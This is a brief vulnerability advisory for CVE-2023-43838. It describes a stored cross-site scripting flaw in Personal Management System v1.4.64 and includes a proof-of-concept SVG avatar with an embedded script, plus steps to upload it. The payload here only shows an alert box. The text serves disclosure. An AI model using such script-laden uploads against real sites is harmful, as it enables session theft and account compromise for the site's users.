# CVE-2023-43838

An arbitrary file upload vulnerability in Personal Management System
 v1.4.64 allows attackers to execute arbitrary code via uploading a
 crafted SVG file into a user profile's avatar.

 ------------------------------------------

 [Additional Information]
 1.) Create alert.svg with the following content:

```
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
       alert("huntr.dev");
    </script>
 </svg>
```


2.) Host .SVG on webserver.

3.) Upload .SVG as avatar image.
4.) When a user opens the avatar in a seperate tab, javascript stored in the .SVG file is executed.


References:
https://github.com/Volmarg/personal-management-system 
